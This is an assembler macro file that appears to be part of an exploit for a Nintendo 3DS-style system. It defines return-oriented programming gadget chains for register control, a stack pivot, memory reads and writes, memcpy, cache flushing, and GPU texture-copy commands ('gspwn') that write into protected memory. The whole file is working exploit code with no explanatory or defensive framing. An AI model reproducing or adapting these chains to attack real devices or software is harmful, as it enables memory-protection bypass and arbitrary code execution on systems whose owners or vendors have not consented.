.macro set_lr,_lr
	.word ROP_MCOPY_POP_R1PC ; pop {r1, pc}
		.word ROP_MCOPY_NOP ; pop {pc}
	.word ROP_MCOPY_POP_R4LR_BX_R1 ; pop {r4, lr} ; bx r1
		.word 0xDEADBABE ; r4 (garbage)
		.word _lr ; lr
.endmacro

; dst_label has to be a file-address-soace address
.macro jump_sp,dst_label
	.word ROP_MCOPY_POP_R0PC ; pop {r0, pc}
		.word dst_label ; r0 => sp
	.word ROP_MCOPY_POP_R1PC ; pop {r1, pc}
		.word ROP_MCOPY_NOP ; pop {pc}
	.word ROP_MCOPY_MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1
.endmacro

.macro ldr_r0,addr
	.word ROP_MCOPY_POP_R0PC
		.word addr
	.word ROP_MCOPY_LDRR0R0_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro str_r0,addr
	.word ROP_MCOPY_POP_R4PC
		.word addr
	.word ROP_MCOPY_STR_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro str_val,addr,val
	.word ROP_MCOPY_POP_R0PC
		.word val
	str_r0 addr
.endmacro

.macro ldr_add_r0,addr,addval
	.word ROP_MCOPY_POP_R0PC
		.word addr
	.word ROP_MCOPY_LDRR0R0_POP_R4PC
		.word addval ; r4
	.word ROP_MCOPY_ADD_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro cmp_derefptr_r0addr,const,neqr0,eqr0
	.word ROP_MCOPY_LDRR0R0_POP_R4PC
		.word 0x100000000 - const
	.word ROP_MCOPY_ADD_R0R4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	.word ROP_MCOPY_POP_R4R5PC
		.word neqr0 ; r4 (new value for r0 if [r0] != const)
		.word eqr0 ; r5 (new value for r0 if [r0] == const)
	.word ROP_MCOPY_CMP_R0x0_MOVNE_R0R4_MOVEQ_R0R5_POP_R4R5R6PC
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr ROP_MCOPY_NOP
	.word ROP_MCOPY_POP_R0PC ; pop {r0, pc}
		.word nanosec_low ; r0
	.word ROP_MCOPY_POP_R1PC ; pop {r1, pc}
		.word nanosec_high ; r1
	.word MCOPY_SVC_SLEEPTHREAD
.endmacro

.macro memcpy,dst,src,size
	set_lr ROP_MCOPY_NOP
	.word ROP_MCOPY_POP_R0PC ; pop {r0, pc}
		.word dst ; r0
	.word ROP_MCOPY_POP_R1PC ; pop {r1, pc}
		.word src ; r1
	.word ROP_MCOPY_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (addr)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MCOPY_MEMCPY
.endmacro

.macro flush_dcache,addr,size
	set_lr ROP_MCOPY_NOP
	.word ROP_MCOPY_POP_R0PC ; pop {r0, pc}
		.word MCOPY_GSPGPU_HANDLE ; r0 (handle ptr)
	.word ROP_MCOPY_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word ROP_MCOPY_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr ; r2 (addr)
		.word size ; r3 (src)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MCOPY_GSPGPU_FLUSHDATACACHE
.endmacro

.macro gspwn,dst,src,size
	set_lr ROP_MCOPY_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_MCOPY_POP_R0PC ; pop {r0, pc}
		.word MCOPY_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_MCOPY_POP_R1PC ; pop {r1, pc}
		.word @@gxCommandPayload ; r1 (cmd addr)
	.word MCOPY_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word dst ; destination address (standin, will be filled in)
		.word size ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro gspwn_dstderefadd,dst_base,dst_offset_ptr,src,size,offset
	ldr_add_r0 dst_offset_ptr, dst_base 
	str_r0 @@gxCommandPayload + 0x8 + offset
	set_lr ROP_MCOPY_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_MCOPY_POP_R0PC ; pop {r0, pc}
		.word MCOPY_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_MCOPY_POP_R1PC ; pop {r1, pc}
		.word @@gxCommandPayload ; r1 (cmd addr)
	.word MCOPY_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word 0xDEADBABE ; destination address (standin, will be filled in)
		.word size ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro
